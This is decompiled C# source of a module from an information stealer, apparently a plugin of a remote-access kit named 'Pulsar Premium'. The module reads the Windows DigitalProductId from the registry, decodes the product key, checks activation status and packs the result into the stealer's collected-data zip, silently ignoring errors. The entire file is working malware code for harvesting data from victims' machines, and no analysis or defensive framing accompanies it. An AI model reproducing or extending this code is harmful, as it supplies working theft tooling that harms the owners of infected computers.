// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Device.ProductKey
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Text;

#nullable disable
namespace Intelix.Targets.Device;

public class ProductKey : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    try
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
      object obj = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")?.GetValue("DigitalProductId");
      if (obj == null)
        return;
      byte[] digitalProductId1 = (byte[]) obj;
      registryKey.Close();
      bool flag = Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2 || Environment.OSVersion.Version.Major > 6;
      string digitalProductId2 = this.GetWindowsProductKeyFromDigitalProductId(digitalProductId1, flag ? ProductKey.DigitalProductIdVersion.Windows8AndUp : ProductKey.DigitalProductIdVersion.UpToWindows7);
      if (string.IsNullOrEmpty(digitalProductId2))
        return;
      string str = ProductKey.IsWindowsActivatedFast() ? "Activated ✅" : "Not Activated ❌";
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("=== Windows Product Key Info ===");
      stringBuilder.AppendLine("Status : " + str);
      stringBuilder.AppendLine("Key    : " + digitalProductId2);
      stringBuilder.AppendLine("================================");
      zip.AddTextFile("ProductKey.txt", stringBuilder.ToString());
    }
    catch
    {
    }
  }

  private string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
  {
    string str1 = string.Empty;
    byte num1 = (byte) ((int) digitalProductId[66] / 6 & 1);
    digitalProductId[66] = (byte) ((int) digitalProductId[66] & 247 | ((int) num1 & 2) * 4);
    int length = 0;
    for (int index1 = 24; index1 >= 0; --index1)
    {
      int index2 = 0;
      for (int index3 = 14; index3 >= 0; --index3)
      {
        int num2 = index2 * 256 /*0x0100*/;
        int num3 = (int) digitalProductId[index3 + 52] + num2;
        digitalProductId[index3 + 52] = (byte) (num3 / 24);
        index2 = num3 % 24;
        length = index2;
      }
      str1 = "BCDFGHJKMPQRTVWXY2346789"[index2].ToString() + str1;
    }
    string str2 = $"{str1.Substring(1, length)}N{str1.Substring(length + 1, str1.Length - (length + 1))}";
    for (int startIndex = 5; startIndex < str2.Length; startIndex += 6)
      str2 = str2.Insert(startIndex, "-");
    return str2;
  }

  private string DecodeProductKey(byte[] digitalProductId)
  {
    char[] chArray1 = new char[24]
    {
      'B',
      'C',
      'D',
      'F',
      'G',
      'H',
      'J',
      'K',
      'M',
      'P',
      'Q',
      'R',
      'T',
      'V',
      'W',
      'X',
      'Y',
      '2',
      '3',
      '4',
      '6',
      '7',
      '8',
      '9'
    };
    char[] chArray2 = new char[29];
    ArrayList arrayList = new ArrayList();
    for (int index = 52; index <= 67; ++index)
      arrayList.Add((object) digitalProductId[index]);
    for (int index1 = 28; index1 >= 0; --index1)
    {
      if ((index1 + 1) % 6 == 0)
      {
        chArray2[index1] = '-';
      }
      else
      {
        int index2 = 0;
        for (int index3 = 14; index3 >= 0; --index3)
        {
          int num = index2 << 8 | (int) (byte) arrayList[index3];
          arrayList[index3] = (object) (byte) (num / 24);
          index2 = num % 24;
          chArray2[index1] = chArray1[index2];
        }
      }
    }
    return new string(chArray2);
  }

  private string GetWindowsProductKeyFromDigitalProductId(
    byte[] digitalProductId,
    ProductKey.DigitalProductIdVersion digitalProductIdVersion)
  {
    return digitalProductIdVersion != ProductKey.DigitalProductIdVersion.Windows8AndUp ? this.DecodeProductKey(digitalProductId) : this.DecodeProductKeyWin8AndUp(digitalProductId);
  }

  public static bool IsWindowsActivatedFast()
  {
    try
    {
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform"))
      {
        if (registryKey != null)
        {
          object obj = registryKey.GetValue("BackupProductKeyDefault");
          return obj != null && obj.ToString().Length > 0;
        }
      }
    }
    catch
    {
    }
    return false;
  }

  private enum DigitalProductIdVersion
  {
    UpToWindows7,
    Windows8AndUp,
  }
}
